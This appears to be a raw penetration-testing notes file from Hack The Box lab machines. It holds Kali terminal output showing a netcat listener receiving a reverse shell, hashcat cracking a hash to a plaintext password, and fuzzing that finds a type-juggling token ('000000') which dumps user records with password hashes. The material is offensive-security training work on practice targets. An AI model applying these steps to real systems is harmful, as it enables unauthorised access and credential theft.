┌──(kali㉿kali)-[~]
└─$ nc -lvnp 6666        
listening on [any] 6666 ...
connect to [10.10.16.67] from (UNKNOWN) [10.129.3.198] 35078
python -c 'import pty; pty.spawn("/bin/sh")'
which python3 && python3 -c 'import pty; pty.spawn("/bin/bash")'

/usr/local/bin/python3

wingftp@wingdata:/opt/wftpserver$ 
wingftp@wingdata:/opt/wftpserver$ ls
ls
Data         pid-wftpserver.pid  version.txt  wftp_default_ssh.key
License.txt  README              webadmin     wftp_default_ssl.crt
Log          session             webclient    wftp_default_ssl.key
lua          session_admin       wftpconsole  wftpserver
wingftp@wingdata:/opt/wftpserver$ 


```
script /dev/null -c bash
```


┌──(kali㉿kali)-[~]
└─$ nano wacky.txt        
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ hashcat -m 1410 wacky.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-Intel(R) Core(TM) i5-10300H CPU @ 2.50GHz, 1845/3691 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 512 MB (2775 MB free)

Dictionary cache hit:
* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1410 (sha256($pass.$salt))
Hash.Target......: 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b87...ingFTP
Time.Started.....: Mon Feb 23 11:28:28 2026 (10 secs)
Time.Estimated...: Mon Feb 23 11:28:38 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1467.1 kH/s (0.80ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 14344192/14344384 (100.00%)
Rejected.........: 0/14344192 (0.00%)
Restore.Point....: 14342144/14344384 (99.98%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: !9huevitorico ->  kristenanne
Hardware.Mon.#01.: Util: 89%

Started: Mon Feb 23 11:28:26 2026
Stopped: Mon Feb 23 11:28:40 2026

![[Pasted image 20260223194215.png]]




![[Pasted image 20260225125747.png]]

hashcat -m 1410 wacky.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt

hashid 56b32eb43e6f15395f6c46c1c9e1cd36

![[Pasted image 20260225125716.png]]

![[Pasted image 20260225125705.png]]


wonderful1

admin didnt work tried the username worked we are in 

cacti **Version 1.2.28**
![[Pasted image 20260225130008.png]]



                                                                                                                                                                                                                                         
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://monitorsfour.htb -x 404

/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                                                                           
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                    
                                                                                                                                                                                                                                           
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_monitorsfour.htb/_26-02-25_03-31-05.txt

Target: http://monitorsfour.htb/

[03:31:05] Starting:                                                                                                                                                                                                                       

Cannot connect to: monitorsfour.htb

Task Completed                                                                                                                                                                                                                             
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ sudo nano /etc/hosts
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://monitorsfour.htb -x 404

/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                                                                           
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                    
                                                                                                                                                                                                                                           
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_monitorsfour.htb/_26-02-25_03-42-27.txt

Target: http://monitorsfour.htb/

[03:42:27] Starting:                                                                                                                                                                                                                       
[03:42:35] 200 -   97B  - /.env                                             
[03:42:38] 403 -  548B  - /.ht_wsr.txt                                      
[03:42:38] 403 -  548B  - /.htaccess.bak1
[03:42:38] 403 -  548B  - /.htaccess.orig                                   
[03:42:38] 403 -  548B  - /.htaccess.sample
[03:42:38] 403 -  548B  - /.htaccess.save
[03:42:38] 403 -  548B  - /.htaccess_sc                                     
[03:42:38] 403 -  548B  - /.htaccess_extra
[03:42:38] 403 -  548B  - /.htaccessOLD2                                    
[03:42:38] 403 -  548B  - /.htaccessOLD
[03:42:38] 403 -  548B  - /.htaccess_orig
[03:42:38] 403 -  548B  - /.htaccessBAK
[03:42:38] 403 -  548B  - /.htpasswd_test                                   
[03:42:38] 403 -  548B  - /.httr-oauth
[03:42:38] 403 -  548B  - /.htm                                             
[03:42:38] 403 -  548B  - /.htpasswds                                       
[03:42:38] 403 -  548B  - /.html
CTRL+C detected: Pausing threads, please wait...                              
[q]uit / [c]ontinue: q                                                      
[s]ave / [q]uit without saving: q
 
Canceled by the user
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ ffuf -c -u http://monitorsfour.htb/ -H "Host: FUZZ.monitorsfour.htb" -w subdomains-top1million-20000.txt -fw 3

Encountered error(s): 1 errors occurred.
        * stat /home/kali/subdomains-top1million-20000.txt: no such file or directory

Fuzz Faster U Fool - v2.1.0-dev

HTTP OPTIONS:
  -H                  Header `"Name: Value"`, separated by colon. Multiple -H flags are accepted.
  -X                  HTTP method to use
  -b                  Cookie data `"NAME1=VALUE1; NAME2=VALUE2"` for copy as curl functionality.
  -cc                 Client cert for authentication. Client key needs to be defined as well for this to work
  -ck                 Client key for authentication. Client certificate needs to be defined as well for this to work
  -d                  POST data
  -http2              Use HTTP2 protocol (default: false)
  -ignore-body        Do not fetch the response content. (default: false)
  -r                  Follow redirects (default: false)
  -raw                Do not encode URI (default: false)
  -recursion          Scan recursively. Only FUZZ keyword is supported, and URL (-u) has to end in it. (default: false)
  -recursion-depth    Maximum recursion depth. (default: 0)
  -recursion-strategy Recursion strategy: "default" for a redirect based, and "greedy" to recurse on all matches (default: default)
  -replay-proxy       Replay matched requests using this proxy.
  -sni                Target TLS SNI, does not support FUZZ keyword
  -timeout            HTTP request timeout in seconds. (default: 10)
  -u                  Target URL
  -x                  Proxy URL (SOCKS5 or HTTP). For example: http://127.0.0.1:8080 or socks5://127.0.0.1:8080

GENERAL OPTIONS:
  -V                  Show version information. (default: false)
  -ac                 Automatically calibrate filtering options (default: false)
  -acc                Custom auto-calibration string. Can be used multiple times. Implies -ac
  -ach                Per host autocalibration (default: false)
  -ack                Autocalibration keyword (default: FUZZ)
  -acs                Custom auto-calibration strategies. Can be used multiple times. Implies -ac
  -c                  Colorize output. (default: false)
  -config             Load configuration from a file
  -json               JSON output, printing newline-delimited JSON records (default: false)
  -maxtime            Maximum running time in seconds for entire process. (default: 0)
  -maxtime-job        Maximum running time in seconds per job. (default: 0)
  -noninteractive     Disable the interactive console functionality (default: false)
  -p                  Seconds of `delay` between requests, or a range of random delay. For example "0.1" or "0.1-2.0"
  -rate               Rate of requests per second (default: 0)
  -s                  Do not print additional information (silent mode) (default: false)
  -sa                 Stop on all error cases. Implies -sf and -se. (default: false)
  -scraperfile        Custom scraper file path
  -scrapers           Active scraper groups (default: all)
  -se                 Stop on spurious errors (default: false)
  -search             Search for a FFUFHASH payload from ffuf history
  -sf                 Stop when > 95% of responses return 403 Forbidden (default: false)
  -t                  Number of concurrent threads. (default: 40)
  -v                  Verbose output, printing full URL and redirect location (if any) with the results. (default: false)

MATCHER OPTIONS:
  -mc                 Match HTTP status codes, or "all" for everything. (default: 200-299,301,302,307,401,403,405,500)
  -ml                 Match amount of lines in response
  -mmode              Matcher set operator. Either of: and, or (default: or)
  -mr                 Match regexp
  -ms                 Match HTTP response size
  -mt                 Match how many milliseconds to the first response byte, either greater or less than. EG: >100 or <100
  -mw                 Match amount of words in response

FILTER OPTIONS:
  -fc                 Filter HTTP status codes from response. Comma separated list of codes and ranges
  -fl                 Filter by amount of lines in response. Comma separated list of line counts and ranges
  -fmode              Filter set operator. Either of: and, or (default: or)
  -fr                 Filter regexp
  -fs                 Filter HTTP response size. Comma separated list of sizes and ranges
  -ft                 Filter by number of milliseconds to the first response byte, either greater or less than. EG: >100 or <100
  -fw                 Filter by amount of words in response. Comma separated list of word counts and ranges

INPUT OPTIONS:
  -D                  DirSearch wordlist compatibility mode. Used in conjunction with -e flag. (default: false)
  -e                  Comma separated list of extensions. Extends FUZZ keyword.
  -enc                Encoders for keywords, eg. 'FUZZ:urlencode b64encode'
  -ic                 Ignore wordlist comments (default: false)
  -input-cmd          Command producing the input. --input-num is required when using this input method. Overrides -w.
  -input-num          Number of inputs to test. Used in conjunction with --input-cmd. (default: 100)
  -input-shell        Shell to be used for running command
  -mode               Multi-wordlist operation mode. Available modes: clusterbomb, pitchfork, sniper (default: clusterbomb)
  -request            File containing the raw http request
  -request-proto      Protocol to use along with raw request (default: https)
  -w                  Wordlist file path and (optional) keyword separated by colon. eg. '/path/to/wordlist:KEYWORD'

OUTPUT OPTIONS:
  -debug-log          Write all of the internal logging to the specified file.
  -o                  Write output to file
  -od                 Directory path to store matched results to.
  -of                 Output file format. Available formats: json, ejson, html, md, csv, ecsv (or, 'all' for all formats) (default: json)
  -or                 Don't create the output file if we don't have results (default: false)

EXAMPLE USAGE:
  Fuzz file paths from wordlist.txt, match all responses but filter out those with content-size 42.
  Colored, verbose output.
    ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v

  Fuzz Host-header, match HTTP 200 responses.
    ffuf -w hosts.txt -u https://example.org/ -H "Host: FUZZ" -mc 200

  Fuzz POST JSON data. Match all responses not containing text "error".
    ffuf -w entries.txt -u https://example.org/ -X POST -H "Content-Type: application/json" \
      -d '{"name": "FUZZ", "anotherkey": "anothervalue"}' -fr "error"

  Fuzz multiple locations. Match only responses reflecting the value of "VAL" keyword. Colored.
    ffuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM=VAL -mr "VAL" -c

  More information and examples: https://github.com/ffuf/ffuf

Encountered error(s): 1 errors occurred.
        * stat /home/kali/subdomains-top1million-20000.txt: no such file or directory

                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ ffuf -c -u http://monitorsfour.htb/ -H "Host: FUZZ.monitorsfour.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 3

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://monitorsfour.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.monitorsfour.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 3
________________________________________________

cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 309ms]
:: Progress: [4989/4989] :: Job [1/1] :: 205 req/sec :: Duration: [0:00:25] :: Errors: 0 ::
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ sudo nano /etc/hosts                                                                                                                           
[sudo] password for kali: 
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ curl http://monitorsfour.htb/user
{"error":"Missing token parameter"}                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ curl http://monitorsfour.htb/token=mm
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ curl http://monitorsfour.htb/token=mm
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ curl http://monitorsfour.htb/token=mmm
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ curl http://monitorsfour.htb/token=mmmm
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ curl http://monitorsfour.htb/user?token=h 
{"error":"Invalid or missing token"}                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ curl http://monitorsfour.htb/user?token=hff
{"error":"Invalid or missing token"}                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ ffuf -c -u http://monitorsfour.htb/user?token=FUZZ -w  /usr/share/seclists/Discovery/DNS/php_loose_comparison.txt -fw 4

Encountered error(s): 1 errors occurred.
        * stat /usr/share/seclists/Discovery/DNS/php_loose_comparison.txt: no such file or directory

Fuzz Faster U Fool - v2.1.0-dev

HTTP OPTIONS:
  -H                  Header `"Name: Value"`, separated by colon. Multiple -H flags are accepted.
  -X                  HTTP method to use
  -b                  Cookie data `"NAME1=VALUE1; NAME2=VALUE2"` for copy as curl functionality.
  -cc                 Client cert for authentication. Client key needs to be defined as well for this to work
  -ck                 Client key for authentication. Client certificate needs to be defined as well for this to work
  -d                  POST data
  -http2              Use HTTP2 protocol (default: false)
  -ignore-body        Do not fetch the response content. (default: false)
  -r                  Follow redirects (default: false)
  -raw                Do not encode URI (default: false)
  -recursion          Scan recursively. Only FUZZ keyword is supported, and URL (-u) has to end in it. (default: false)
  -recursion-depth    Maximum recursion depth. (default: 0)
  -recursion-strategy Recursion strategy: "default" for a redirect based, and "greedy" to recurse on all matches (default: default)
  -replay-proxy       Replay matched requests using this proxy.
  -sni                Target TLS SNI, does not support FUZZ keyword
  -timeout            HTTP request timeout in seconds. (default: 10)
  -u                  Target URL
  -x                  Proxy URL (SOCKS5 or HTTP). For example: http://127.0.0.1:8080 or socks5://127.0.0.1:8080

GENERAL OPTIONS:
  -V                  Show version information. (default: false)
  -ac                 Automatically calibrate filtering options (default: false)
  -acc                Custom auto-calibration string. Can be used multiple times. Implies -ac
  -ach                Per host autocalibration (default: false)
  -ack                Autocalibration keyword (default: FUZZ)
  -acs                Custom auto-calibration strategies. Can be used multiple times. Implies -ac
  -c                  Colorize output. (default: false)
  -config             Load configuration from a file
  -json               JSON output, printing newline-delimited JSON records (default: false)
  -maxtime            Maximum running time in seconds for entire process. (default: 0)
  -maxtime-job        Maximum running time in seconds per job. (default: 0)
  -noninteractive     Disable the interactive console functionality (default: false)
  -p                  Seconds of `delay` between requests, or a range of random delay. For example "0.1" or "0.1-2.0"
  -rate               Rate of requests per second (default: 0)
  -s                  Do not print additional information (silent mode) (default: false)
  -sa                 Stop on all error cases. Implies -sf and -se. (default: false)
  -scraperfile        Custom scraper file path
  -scrapers           Active scraper groups (default: all)
  -se                 Stop on spurious errors (default: false)
  -search             Search for a FFUFHASH payload from ffuf history
  -sf                 Stop when > 95% of responses return 403 Forbidden (default: false)
  -t                  Number of concurrent threads. (default: 40)
  -v                  Verbose output, printing full URL and redirect location (if any) with the results. (default: false)

MATCHER OPTIONS:
  -mc                 Match HTTP status codes, or "all" for everything. (default: 200-299,301,302,307,401,403,405,500)
  -ml                 Match amount of lines in response
  -mmode              Matcher set operator. Either of: and, or (default: or)
  -mr                 Match regexp
  -ms                 Match HTTP response size
  -mt                 Match how many milliseconds to the first response byte, either greater or less than. EG: >100 or <100
  -mw                 Match amount of words in response

FILTER OPTIONS:
  -fc                 Filter HTTP status codes from response. Comma separated list of codes and ranges
  -fl                 Filter by amount of lines in response. Comma separated list of line counts and ranges
  -fmode              Filter set operator. Either of: and, or (default: or)
  -fr                 Filter regexp
  -fs                 Filter HTTP response size. Comma separated list of sizes and ranges
  -ft                 Filter by number of milliseconds to the first response byte, either greater or less than. EG: >100 or <100
  -fw                 Filter by amount of words in response. Comma separated list of word counts and ranges

INPUT OPTIONS:
  -D                  DirSearch wordlist compatibility mode. Used in conjunction with -e flag. (default: false)
  -e                  Comma separated list of extensions. Extends FUZZ keyword.
  -enc                Encoders for keywords, eg. 'FUZZ:urlencode b64encode'
  -ic                 Ignore wordlist comments (default: false)
  -input-cmd          Command producing the input. --input-num is required when using this input method. Overrides -w.
  -input-num          Number of inputs to test. Used in conjunction with --input-cmd. (default: 100)
  -input-shell        Shell to be used for running command
  -mode               Multi-wordlist operation mode. Available modes: clusterbomb, pitchfork, sniper (default: clusterbomb)
  -request            File containing the raw http request
  -request-proto      Protocol to use along with raw request (default: https)
  -w                  Wordlist file path and (optional) keyword separated by colon. eg. '/path/to/wordlist:KEYWORD'

OUTPUT OPTIONS:
  -debug-log          Write all of the internal logging to the specified file.
  -o                  Write output to file
  -od                 Directory path to store matched results to.
  -of                 Output file format. Available formats: json, ejson, html, md, csv, ecsv (or, 'all' for all formats) (default: json)
  -or                 Don't create the output file if we don't have results (default: false)

EXAMPLE USAGE:
  Fuzz file paths from wordlist.txt, match all responses but filter out those with content-size 42.
  Colored, verbose output.
    ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v

  Fuzz Host-header, match HTTP 200 responses.
    ffuf -w hosts.txt -u https://example.org/ -H "Host: FUZZ" -mc 200

  Fuzz POST JSON data. Match all responses not containing text "error".
    ffuf -w entries.txt -u https://example.org/ -X POST -H "Content-Type: application/json" \
      -d '{"name": "FUZZ", "anotherkey": "anothervalue"}' -fr "error"

  Fuzz multiple locations. Match only responses reflecting the value of "VAL" keyword. Colored.
    ffuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM=VAL -mr "VAL" -c

  More information and examples: https://github.com/ffuf/ffuf

Encountered error(s): 1 errors occurred.
        * stat /usr/share/seclists/Discovery/DNS/php_loose_comparison.txt: no such file or directory

                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ ffuf -c -u http://monitorsfour.htb/user?token=FUZZ -w  /usr/share/seclists/Web-Shells/PHP/obfuscated-phpshell.php -fw 4 


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://monitorsfour.htb/user?token=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Web-Shells/PHP/obfuscated-phpshell.php
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 4
________________________________________________

:: Progress: [22/22] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ ffuf -c -u http://monitorsfour.htb/user?token=FUZZ -w  /usr/share/seclists/Fuzzing/6-digits-000000-999999.txt -fw 4 


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://monitorsfour.htb/user?token=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/6-digits-000000-999999.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 4
________________________________________________

000000                  [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 375ms]
[WARN] Caught keyboard interrupt (Ctrl-C)


                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ curl http://monitorsfour.htb/token=000000                                                                              
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ ffuf -c -u http://monitorsfour.htb/user?token=FUZZ -w  /usr/share/seclists/Fuzzing/6-digits-000000-999999.txt -fw 4


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://monitorsfour.htb/user?token=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/6-digits-000000-999999.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 4
________________________________________________

000000                  [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 215ms]
[WARN] Caught keyboard interrupt (Ctrl-C)


                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ curl http://monitorsfour.htb/token=0e1234                                                                          
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ curl -i "[http://monitorsfour.htb/user?token=000000](http://monitorsfour.htb/user?token=000000)" | jq '.[]' > users.json
curl: (3) bad range in URL position 2:
[http://monitorsfour.htb/user?token=000000](http://monitorsfour.htb/user?token=000000)
 ^
Command 'jq' not found, but can be installed with:
sudo apt install jq
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ sudo apt install jq      
[sudo] password for kali: 
The following packages were automatically installed and are no longer required:
  amass-common             libgpgme45          libmongocrypt0  librav1e0.7    libx264-164                     python3-click-plugins                 python3-kismetcapturertl433   samba-ad-dc
  libbluray2               libjs-jquery-ui     libnet1         libtheoradec1  libxml2                         python3-gpg                           python3-kismetcapturertladsb  samba-ad-provision
  libbson-1.0-0t64         libjs-underscore    libplacebo349   libtheoraenc1  linux-image-6.12.38+kali-amd64  python3-kismetcapturebtgeiger         python3-kismetcapturertlamr   samba-dsdb-modules
  libconfig-inifiles-perl  libmongoc-1.0-0t64  libportmidi0    libudfread0    python3-bluepy                  python3-kismetcapturefreaklabszigbee  python3-zombie-imp            tini
Use 'sudo apt autoremove' to remove them.

Upgrading:
  libjq1
                                                                                                                                                                                                                                           
Installing:
  jq
                                                                                                                                                                                                                                           
Summary:
  Upgrading: 1, Installing: 1, Removing: 0, Not Upgrading: 1346
  Download size: 85.7 kB / 253 kB
  Space needed: 138 kB / 16.7 GB available

Continue? [Y/n] y
Get:1 http://http.kali.org/kali kali-rolling/main amd64 jq amd64 1.8.1-4+b1 [85.7 kB]
Fetched 85.7 kB in 2s (35.6 kB/s)
(Reading database… 451298 files and directories currently installed.)
Preparing to unpack …/libjq1_1.8.1-4+b1_amd64.deb…
Unpacking libjq1:amd64 (1.8.1-4+b1) over (1.8.1-4)…
Selecting previously unselected package jq.
Preparing to unpack …/jq_1.8.1-4+b1_amd64.deb…
Unpacking jq (1.8.1-4+b1)…
Setting up libjq1:amd64 (1.8.1-4+b1)…
Setting up jq (1.8.1-4+b1)…
Processing triggers for libc-bin (2.42-5)…
Processing triggers for man-db (2.13.1-1)…
Processing triggers for kali-menu (2025.4.2)…
Scanning processes...                                                                                                                                                                                                                      
Scanning linux images...                                                                                                                                                                                                                   

Running kernel seems to be up-to-date.

No services need to be restarted.

No containers need to be restarted.

No user sessions are running outdated binaries.

No VM guests are running outdated hypervisor (qemu) binaries on this host.
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ curl -i "[http://monitorsfour.htb/user?token=000000](http://monitorsfour.htb/user?token=000000)" | jq '.[]' > users.json
curl: (3) bad range in URL position 2:
[http://monitorsfour.htb/user?token=000000](http://monitorsfour.htb/user?token=000000)
 ^
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ curl -i "http://monitorsfour.htb/user?token=000000" | jq '.[]' > users.json
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100   1113   0   1113   0      0   1392      0                              0
jq: parse error: Invalid numeric literal at line 1, column 9
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ curl -i "http://monitorsfour.htb/user?token=0e1234" | jq '.[]' > users.json
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100   1113   0   1113   0      0   1258      0                              0
jq: parse error: Invalid numeric literal at line 1, column 9
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ curl -i "http://monitorsfour.htb/user?token=000000" | jq '.[]' > users.json
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100   1113   0   1113   0      0   1747      0                              0
jq: parse error: Invalid numeric literal at line 1, column 9
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ cat users.json                                                             
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ curl -s "http://monitorsfour.htb/user?token=000000" | jq '.' > users.json
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ cat u         
cat: u: No such file or directory
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ cat users.json 
[
  {
    "id": 2,
    "username": "admin",
    "email": "admin@monitorsfour.htb",
    "password": "56b32eb43e6f15395f6c46c1c9e1cd36",
    "role": "super user",
    "token": "8024b78f83f102da4f",
    "name": "Marcus Higgins",
    "position": "System Administrator",
    "dob": "1978-04-26",
    "start_date": "2021-01-12",
    "salary": "320800.00"
  },
  {
    "id": 5,
    "username": "mwatson",
    "email": "mwatson@monitorsfour.htb",
    "password": "69196959c16b26ef00b77d82cf6eb169",
    "role": "user",
    "token": "0e543210987654321",
    "name": "Michael Watson",
    "position": "Website Administrator",
    "dob": "1985-02-15",
    "start_date": "2021-05-11",
    "salary": "75000.00"
  },
  {
    "id": 6,
    "username": "janderson",
    "email": "janderson@monitorsfour.htb",
    "password": "2a22dcf99190c322d974c8df5ba3256b",
    "role": "user",
    "token": "0e999999999999999",
    "name": "Jennifer Anderson",
    "position": "Network Engineer",
    "dob": "1990-07-16",
    "start_date": "2021-06-20",
    "salary": "68000.00"
  },
  {
    "id": 7,
    "username": "dthompson",
    "email": "dthompson@monitorsfour.htb",
    "password": "8d4a7e7fd08555133e056d9aacb1e519",
    "role": "user",
    "token": "0e111111111111111",
    "name": "David Thompson",
    "position": "Database Manager",
    "dob": "1982-11-23",
    "start_date": "2022-09-15",
    "salary": "83000.00"
  }
]
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ echo '56b32eb43e6f15395f6c46c1c9e1cd36' > hashmonster.txt                                
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ hashcat -m 1410 hashmonster.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-Intel(R) Core(TM) i5-10300H CPU @ 2.50GHz, 1845/3691 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashfile 'hashmonster.txt' on line 1 (56b32eb43e6f15395f6c46c1c9e1cd36): Token length exception

* Token length exception: 1/1 hashes
  This error happens if the wrong hash type is specified, if the hashes are
  malformed, or if input is otherwise not as expected (for example, if the
  --username or --dynamic-x option is used but no username or dynamic-tag is present)

